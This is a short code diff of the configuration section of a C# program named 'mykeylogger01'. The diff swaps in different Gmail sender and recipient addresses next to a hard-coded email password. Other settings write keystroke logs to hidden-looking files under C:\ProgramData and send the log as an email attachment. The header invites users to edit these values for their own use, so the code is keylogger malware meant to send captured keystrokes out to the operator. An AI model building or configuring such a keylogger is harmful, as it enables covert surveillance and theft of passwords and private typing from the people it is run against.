@@ -11,9 +11,9 @@ namespace mykeylogger01
     class Program
     {
         // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
-        private const string FROM_EMAIL_ADDRESS = "josh.cyber.test@gmail.com";
+        private const string FROM_EMAIL_ADDRESS = "lilylspedia@gmail.com";
         private const string FROM_EMAIL_PASSWORD = "dontlogintome";
-        private const string TO_EMAIL_ADDRESS = "josh.cyber.test@gmail.com";
+        private const string TO_EMAIL_ADDRESS = "lilylspedia@gmail.com";
         private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
         private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
         private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
